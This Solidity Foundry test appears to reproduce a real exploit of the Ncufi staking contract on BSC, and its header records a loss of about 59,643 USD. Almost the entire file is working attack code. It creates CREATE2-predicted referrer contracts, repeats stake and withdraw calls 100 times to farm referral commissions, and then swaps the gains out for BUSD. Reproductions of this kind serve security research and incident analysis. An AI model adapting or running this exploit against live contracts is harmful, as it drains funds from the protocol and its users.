// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo -- Total Lost : ~59643 USD
// TX : https://app.blocksec.com/explorer/tx/bsc/0x556419e0a6ee8e6de6b3679605f9f62ad013007419a1b55c9f56590a824bfb52
// Attacker : https://bscscan.com/address/0xb6911dee6a5b1c65ad1ac11a99aec09c2cf83c0e
// Attack Contract : https://bscscan.com/address/0x4237d006471b38af0e1691c00d96193a8ff5709f
// GUY : https://x.com/0xNickLFranklin/status/1803317022513832301

interface INcufi{
   struct order{
        uint id;
        uint amount;
        uint apy;
        uint period;
        uint startdate;
        uint enddate;
        bool complet;
        address USer;
        uint withdraltime;
        uint PRice;
        uint decimal;
       // uint earningwithdralusd;
        uint earningwithdralAkita;
     }
    function listMyoID() external view returns (order [] memory);
     function register(address referrer)  external; 
     function STAKE (uint amout ,uint day,uint countryid) external; 
    function withdral(uint id) external;
    function swapCommision (uint amount) external;

}
interface IMoney{
    function getAdd()external returns(address);
}
contract Exploit is Test {
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IERC20 BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    INcufi Ncufi=INcufi(0x80df77b2Ae5828FF499A735ee823D6CD7Cf95f5a);
    IERC20 AKITADEF = IERC20(0x3213573C46eb905bA17F0Bb650E10C2352552e8a);
    address public One_referer;
    address public Two_referer;
    function setUp() public {
        cheats.createSelectFork("bsc", 39729927);
        deal(address(BUSD),address(this),50000 ether);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[End] Attacker BUSD before exploit", BUSD.balanceOf(address(this)), 18);
        attack();
        emit log_named_decimal_uint("[End] Attacker Ncufi after exploit", AKITADEF.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[End] Attacker BUSD after exploit", BUSD.balanceOf(address(this)), 18);

    }

    function attack()public {
    //Step 1
        One_referer=create_contract(1);
        // address referer=IMoney(One_referer).getAdd();
        Two_referer=cal_address(2,address(this));
        Ncufi.register(Two_referer);

    //Step 2
        uint256 i=0;
        BUSD.approve(address(Ncufi),9999999999 ether);
        while(i<100){
            Ncufi.STAKE(10000 ether, 0, 1);
            vm.warp(block.timestamp + 100);
            INcufi.order[] memory orders = Ncufi.listMyoID();
            uint id = orders[i].id;
            Start(id);
            i++;
    }

    //End
    // emit log_named_decimal_uint("[End] victim Ncufi BUSD balance", BUSD.balanceOf(address(Ncufi)), 18);
        AKITADEF.approve(address(Ncufi),type(uint256).max);
        Ncufi.swapCommision(59643.218325000000000000 ether);
    }
    function Start(uint256 id)public {
        Ncufi.withdral(id);
        uint256 A=AKITADEF.balanceOf(One_referer);
        uint256 B=AKITADEF.balanceOf(Two_referer);
        if(A>0 || B > 0){
            AKITADEF.transferFrom(address(One_referer),address(this),A);
            AKITADEF.transferFrom(address(Two_referer),address(this),B);
        }
    }
    function cal_address(uint256 time,address owner) internal returns(address){
        bytes memory bytecode = type(Moneys).creationCode;
        uint256 _salt = time;
        bytecode = abi.encodePacked(bytecode, abi.encode(owner));
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(One_referer), _salt, keccak256(bytecode)));
        address hack_contract =  address(uint160(uint256(hash)));
        return hack_contract;
    }
     function create_contracts(uint256 times) internal returns(address) {
            bytes memory bytecode = type(Moneys).creationCode;
            uint256 _salt = times;
            bytecode = abi.encodePacked(bytecode);
            bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode)));
            address hack_contract =  address(uint160(uint256(hash)));
            address addr;
            // Use create2 to Send money first.
            assembly {
                addr := create2(0, add(bytecode, 0x20), mload(bytecode), _salt)
            }
            return hack_contract;
    }
  function create_contract(uint256 times) internal returns(address) {
            bytes memory bytecode = type(Money).creationCode;
            uint256 _salt = times;
            bytecode = abi.encodePacked(bytecode);
            bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode)));
            address hack_contract =  address(uint160(uint256(hash)));
            address addr;
            // Use create2 to Send money first.
            assembly {
                addr := create2(0, add(bytecode, 0x20), mload(bytecode), _salt)
            }
            return hack_contract;

        }
    }
contract Money is Test{
    IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IERC20 BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 AKITADEF = IERC20(0x3213573C46eb905bA17F0Bb650E10C2352552e8a);
    INcufi Ncufi=INcufi(0x80df77b2Ae5828FF499A735ee823D6CD7Cf95f5a);
    address Referer=0xcFa207a442084a2c343996D09f06b40970247afF;
    uint256 constant PRECISION = 10**18;
    address owner;
    address Moneysadd;
    constructor() {
        owner = msg.sender;
        AKITADEF.approve(address(msg.sender),type(uint256).max);
        Ncufi.register(Referer);
        address add=create_contracts(2,msg.sender);
        Moneysadd=add;
    }

    function getAdd()public returns(address){
        require(owner==msg.sender,"error");
        return Moneysadd;
    }
     function create_contracts(uint256 times,address onwer) internal returns(address) {
            bytes memory bytecode = type(Moneys).creationCode;
            uint256 _salt = times;
            // bytecode = abi.encodePacked(bytecode);
            bytecode = abi.encodePacked(bytecode, abi.encode(owner));
            bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode)));
            address hack_contract =  address(uint160(uint256(hash)));
            address addr;
            // Use create2 to Send money first.
            assembly {
                addr := create2(0, add(bytecode, 0x20), mload(bytecode), _salt)
            }
            return hack_contract;
    }
    fallback() external payable {}
}
contract Moneys is Test{
    IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IERC20 BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 AKITADEF = IERC20(0x3213573C46eb905bA17F0Bb650E10C2352552e8a);
    INcufi Ncufi=INcufi(0x80df77b2Ae5828FF499A735ee823D6CD7Cf95f5a);
    address Referer=0xEB1Df3Bed5bd20c010CAAd4EE18Ff7A697334E68;
    uint256 constant PRECISION = 10**18;
    address owner;

    constructor(address aAddress) {
        owner = aAddress;
        AKITADEF.approve(address(owner),type(uint256).max);
        Ncufi.register(msg.sender);

    }

    fallback() external payable {}
}
